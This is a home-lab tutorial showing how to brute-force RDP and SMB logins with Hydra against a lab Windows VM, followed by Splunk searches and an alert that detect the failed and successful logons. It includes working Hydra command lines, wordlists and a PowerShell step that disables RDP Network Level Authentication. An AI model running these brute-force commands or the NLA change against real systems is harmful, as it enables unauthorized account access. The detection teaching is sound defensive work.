# Hydra - Brute Force Attack & Detection

## Overview

After reconnaissance reveals open ports, the attacker moves to credential attacks. Hydra is a fast, parallelized login cracker that supports dozens of protocols. In this lab you'll use it against **RDP (port 3389)** and **SMB (port 445)** - the two most common Windows remote access services.

**What this generates in logs:**

- `Event ID 4625` - Failed logon attempt (one per bad password guess)
- `Event ID 4740` - Account locked out (if lockout policy is set)
- `Event ID 4624` - Successful logon (if the correct password is found)
- `Event ID 4648` - Logon with explicit credentials

---

## Pre-Attack Checklist

Confirm these are done before running Hydra (covered in `README.md`):

- [ ] RDP is enabled on Windows 10 VM
- [ ] Test user `testuser` exists with password `Password123`
- [ ] Account lockout policy is set (5 bad attempts)
- [ ] Splunk is running and ingesting Security logs
- [ ] You have a live Splunk search open to watch events come in

---

## Step 1 - Create a Wordlist on Kali

Kali comes with **rockyou.txt** - a massive real-world password list. You'll use a small subset of it for this lab so the attack finishes in a reasonable time.

```bash
# rockyou.txt is compressed by default on Kali — extract it first
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Confirm it extracted
wc -l /usr/share/wordlists/rockyou.txt
# Should show ~14 million lines

# Create a small custom wordlist that INCLUDES the target password
# This ensures the brute force succeeds for demo purposes
cat > ~/lab-passwords.txt << 'EOF'
admin
password
Password1
123456
letmein
welcome
qwerty
monkey
dragon
password1
Password123
test123
abc123
iloveyou
sunshine
EOF

echo "Wordlist created:"
cat ~/lab-passwords.txt
```

---

## Step 2 - Brute Force RDP (Port 3389)

Run all Hydra commands on **Kali Linux**. Replace `192.168.0.123` with your Windows 10 VM IP.

### Attack 1 - RDP Single Username, Wordlist

```bash
# Basic RDP brute force
# -l  = single username to try
# -P  = password file/wordlist
# -t  = number of parallel tasks (keep low for RDP — 4 is safe)
# -V  = verbose output (shows each attempt)
# rdp = protocol

hydra -l testuser -P ~/lab-passwords.txt -t 4 -V rdp://192.168.0.123
```

### Attack 2 - RDP with Timeout and Retry Options

```bash
# More controlled attack — adds wait between attempts
# -w  = wait time between connections (seconds)
# -f  = stop after first valid credentials found

hydra -l testuser -P ~/lab-passwords.txt -t 4 -w 3 -f -V rdp://192.168.0.123
```

### Attack 3 - RDP Multiple Usernames

```bash
# Create a username list
cat > ~/lab-users.txt << 'EOF'
administrator
admin
testuser
user
guest
EOF

# Try multiple usernames with the wordlist
hydra -L ~/lab-users.txt -P ~/lab-passwords.txt -t 4 -V rdp://192.168.0.123
```

### What Successful Hydra Output Looks Like

```
[DATA] max 4 tasks per 1 server
[DATA] attacking rdp://192.168.0.123:3389/
[ATTEMPT] target 192.168.0.123 - login "testuser" - pass "admin" - 1 of 15
[ATTEMPT] target 192.168.0.123 - login "testuser" - pass "password" - 2 of 15
...
[3389][rdp] host: 192.168.0.123  login: testuser  password: Password123
[STATUS] attack finished for 192.168.0.123 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

---

## Step 3 - Brute Force SMB (Port 445)

SMB is used for file sharing and is another common brute force target on Windows networks.

```bash
# SMB brute force
# Protocol: smb
hydra -l testuser -P ~/lab-passwords.txt -t 4 -V smb://192.168.0.123
```

```bash
# SMB with multiple users
hydra -L ~/lab-users.txt -P ~/lab-passwords.txt -t 2 -V smb://192.168.0.123
```

> Note: If you get `[ERROR] freerdp: The connection failed to establish` for RDP but no events in Splunk, make sure NLA (Network Level Authentication) is disabled. See the troubleshooting section below.

---

## Step 4 - Detect the Brute Force in Splunk

After running Hydra, go to Splunk Web and run these searches.

### Find All Failed Login Attempts (Event ID 4625)

```spl
index=wineventlog EventCode=4625
| table _time, Account_Name, Workstation_Name, Logon_Type, Failure_Reason, src_ip
| sort -_time
```

### Count Failed Logins by Source - Identify the Attacker

```spl
index=wineventlog EventCode=4625
| stats count as failed_attempts by Account_Name, Workstation_Name
| sort -failed_attempts
| rename Account_Name as "Target Account", Workstation_Name as "Source Machine", failed_attempts as "Failed Attempts"
```

### Brute Force Detection Rule - 5+ Failures in 5 Minutes

This is the core detection query. It flags any account that has more than 5 failed logins within a 5-minute window - a clear indicator of brute force.

```spl
index=wineventlog EventCode=4625
| bin _time span=5m
| stats count as failures by _time, Account_Name, Workstation_Name
| where failures >= 5
| sort -_time
| rename Account_Name as "Target Account", Workstation_Name as "Attacker Source", failures as "Failed Attempts in 5min"
```

### Find Account Lockout Events (Event ID 4740)

```spl
index=wineventlog EventCode=4740
| table _time, TargetUserName, SubjectUserName, SubjectDomainName
| sort -_time
| rename TargetUserName as "Locked Account", SubjectUserName as "Caller"
```

### Find Successful Login After Many Failures (Successful Brute Force)

```spl
index=wineventlog (EventCode=4625 OR EventCode=4624)
| eval login_type=if(EventCode=4624, "SUCCESS", "FAILURE")
| stats count(eval(login_type="FAILURE")) as failures,
        count(eval(login_type="SUCCESS")) as successes
        by Account_Name
| where failures > 3 AND successes > 0
| sort -failures
| rename Account_Name as "Account", failures as "Failed Attempts", successes as "Successful Logins"
```

This is one of the most valuable queries - it finds accounts where someone failed many times and then succeeded, which is the signature pattern of a successful brute force.

### Timeline View - Attack Over Time

```spl
index=wineventlog EventCode=4625
| timechart span=1m count as "Failed Logins"
```

This creates a time chart showing the spike of failed logins when Hydra ran - great for your dashboard and screenshots.

---

## Step 5 - Save a Brute Force Detection Alert

1. Run the **5+ failures in 5 minutes** query in Splunk Web
2. Click **Save As** → **Alert**
3. Configure:
   - Title: `Brute Force Attack Detected`
   - Alert type: `Real-time`
   - Trigger condition: Number of results is greater than `0`
   - Trigger actions: `Add to Triggered Alerts` + `Log Event`
4. Click **Save**

---

## Step 6 - Logon Type Reference

Event ID 4625 and 4624 include a `Logon_Type` field. This tells you *how* someone logged in, which helps distinguish RDP from SMB from local logins.

| Logon Type | Description       | Triggered By              |
| ---------- | ----------------- | ------------------------- |
| `2`        | Interactive       | Local keyboard login      |
| `3`        | Network           | SMB, file share access    |
| `7`        | Unlock            | Workstation unlock        |
| `10`       | RemoteInteractive | RDP login                 |
| `11`       | CachedInteractive | Cached domain credentials |

Filter by logon type in your searches:

```spl
# Only RDP brute force attempts (Logon Type 10)
index=wineventlog EventCode=4625 Logon_Type=10
| stats count by Account_Name, Workstation_Name
| sort -count
```

```spl
# Only SMB/network brute force attempts (Logon Type 3)
index=wineventlog EventCode=4625 Logon_Type=3
| stats count by Account_Name, Workstation_Name
| sort -count
```

---

## Troubleshooting

| Problem                                           | Fix                                                       |
| ------------------------------------------------- | --------------------------------------------------------- |
| Hydra gets no results and no events in Splunk     | RDP may require NLA                                       |
| Events appear but `Workstation_Name` is blank     | Normal for network logons - use `IpAddress` field instead |
| Account lockout happens too fast                  | Hydra is set too aggressive - reduce `-t` to 2            |
| Hydra says `[ERROR] Child with pid XX terminated` | Reduce threads: `-t 1` for RDP                            |
| No Event ID 4740 (lockout) appearing              | Verify lockout policy: `net accounts`                     |

### Disable NLA for RDP (If Hydra Can't Connect)

Run on Windows 10 in **PowerShell as Administrator**:

```powershell
# Disable Network Level Authentication
# This allows connections without pre-authentication (less secure — lab only)
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
  -Name "UserAuthentication" -Value 0

# Restart RDP service to apply
Restart-Service -Name "TermService" -Force
```

---

## Next Step

Proceed to **[metasploit-exploit.md](./metasploit-exploit.md)** for the optional exploitation phase.
